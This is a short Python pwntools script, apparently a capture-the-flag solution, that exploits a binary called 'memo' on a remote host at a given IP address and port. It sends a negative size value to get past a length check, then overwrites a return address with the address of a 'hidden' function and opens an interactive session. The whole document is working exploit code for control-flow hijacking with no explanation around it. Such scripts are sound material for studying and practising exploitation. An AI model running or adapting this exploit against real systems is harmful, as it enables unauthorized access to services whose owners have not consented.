from pwn import *

target = ELF('./memo')

r = remote('133.242.68.223', 35285)
# r = process('./memo')

r.sendlineafter('Input size : ', '-96')

payload = ''
payload += 'A' * 8
# payload += p64(target.symbols['hidden'])
payload += p64(target.symbols['hidden'] + 4)
r.sendlineafter('Input Content : ', payload)

r.interactive()
